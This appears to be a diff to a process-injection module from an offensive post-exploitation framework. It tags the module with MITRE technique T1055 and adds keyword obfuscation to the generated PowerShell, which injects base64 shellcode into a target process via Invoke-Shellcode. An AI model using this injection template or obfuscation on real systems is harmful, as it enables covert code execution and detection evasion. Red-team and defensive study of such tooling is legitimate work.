@@ -1,6 +1,8 @@
 from __future__ import print_function
-from builtins import str
+
 from builtins import object
+from builtins import str
+
 from lib.common import helpers
 
 
@@ -18,6 +20,10 @@ class Module(object):
 
             # More verbose multi-line description of the module
             'Description': ('Injects a PIC shellcode payload into a target process, via Invoke-Shellcode'),
+
+            'Software': '',
+
+            'Techniques': ['T1055'],
 
             # True if the module needs to run in the background
             'Background': True,
@@ -155,4 +161,6 @@ class Module(object):
         #pow_array = "@(0x" + pow_array + " )"
         script += "\nInvoke-Shellcode -ProcessID {} -Shellcode $([Convert]::FromBase64String(\"{}\")) -Force".format(procID, encoded_sc)
         script += scriptEnd
+        script = helpers.keyword_obfuscation(script)
+
         return script
